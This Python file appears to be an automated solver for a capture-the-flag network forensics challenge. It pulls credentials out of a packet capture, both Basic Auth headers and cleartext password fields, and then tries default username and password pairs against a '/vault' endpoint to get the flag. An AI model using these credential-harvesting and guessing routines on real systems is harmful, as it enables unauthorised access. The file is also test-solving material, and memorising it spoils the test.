"""The Sirens' Call: Network Forensics solver."""
from flag_utils import extract_flag
import requests
import base64

class SirensSolver:
    """Extract credentials from PCAP and use for vault access."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        1. Download capture.pcap attachment
        2. Parse to find cleartext credentials
        3. Use credentials with GET /vault (HTTP Basic Auth)
        """
        print("=== The Sirens' Call: Network Forensics ===", flush=True)

        try:
            # Try to download PCAP from common attachment endpoints
            attachment_urls = [
                f"{self.base_url}/attachment/capture.pcap",
                f"{self.base_url}/download/capture.pcap",
                f"{self.base_url}/files/capture.pcap",
                f"{self.base_url}/capture.pcap",
            ]

            pcap_data = None
            for url in attachment_urls:
                try:
                    resp = requests.get(url, timeout=10)
                    if resp.status_code == 200 and len(resp.content) > 100:
                        pcap_data = resp.content
                        print(f"Downloaded PCAP from {url}: {len(pcap_data)} bytes", flush=True)
                        break
                except Exception as e:
                    print(f"Failed to download from {url}: {e}", flush=True)

            if not pcap_data:
                print("Could not download PCAP, trying to parse from description", flush=True)
                # Maybe credentials are in the challenge description itself
                # Try common default credentials
                default_creds = [
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("user", "password"),
                    ("vault", "vault"),
                    ("root", "root"),
                ]

                for username, password in default_creds:
                    try:
                        resp = requests.get(
                            f"{self.base_url}/vault",
                            auth=(username, password),
                            timeout=10
                        )
                        print(f"Vault attempt {username}:{password}: {resp.status_code}", flush=True)

                        if resp.status_code == 200:
                            print(f"Response: {resp.text[:500]}", flush=True)
                            flag = extract_flag(resp.text)
                            if flag:
                                    return flag
                    except Exception as e:
                        print(f"Error: {e}", flush=True)

                return None

            # Parse PCAP to find credentials
            # Look for HTTP Basic Auth headers or cleartext passwords
            # Search for common patterns
            pcap_str = pcap_data.decode('latin-1', errors='ignore')

            # Look for Authorization header
            import re
            auth_headers = re.findall(r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', pcap_str, re.IGNORECASE)

            for auth in auth_headers:
                try:
                    decoded = base64.b64decode(auth).decode('utf-8')
                    print(f"Found Basic Auth: {decoded}", flush=True)

                    if ":" in decoded:
                        username, password = decoded.split(":", 1)

                        # Try this credential
                        resp = requests.get(
                            f"{self.base_url}/vault",
                            auth=(username, password),
                            timeout=10
                        )
                        print(f"Vault with extracted creds: {resp.status_code}", flush=True)
                        print(f"Response: {resp.text[:500]}", flush=True)

                        if resp.status_code == 200:
                            flag = extract_flag(resp.text)
                            if flag:
                                    return flag
                except Exception as e:
                    print(f"Error decoding auth: {e}", flush=True)

            # Also look for cleartext passwords in HTTP bodies
            password_patterns = [
                r'password["\s:=]+([^\s"&]+)',
                r'passwd["\s:=]+([^\s"&]+)',
                r'pwd["\s:=]+([^\s"&]+)',
                r'username["\s:=]+([^\s"&]+)',
                r'user["\s:=]+([^\s"&]+)',
            ]

            candidates = {}
            for pattern in password_patterns:
                matches = re.finditer(pattern, pcap_str, re.IGNORECASE)
                for match in matches:
                    key = "password" if "pass" in pattern.lower() or "pwd" in pattern.lower() else "username"
                    value = match.group(1).strip()
                    candidates[key] = value
                    print(f"Found {key}: {value}", flush=True)

            # Try combination
            if "username" in candidates and "password" in candidates:
                try:
                    resp = requests.get(
                        f"{self.base_url}/vault",
                        auth=(candidates["username"], candidates["password"]),
                        timeout=10
                    )
                    print(f"Vault with extracted creds: {resp.status_code}", flush=True)

                    if resp.status_code == 200:
                        flag = extract_flag(resp.text)
                        if flag:
                                return flag
                except Exception as e:
                    print(f"Error: {e}", flush=True)

        except Exception as e:
            print(f"Error: {e}", flush=True)
            import traceback
            traceback.print_exc()

        print("Failed to extract credentials from PCAP", flush=True)
        return None
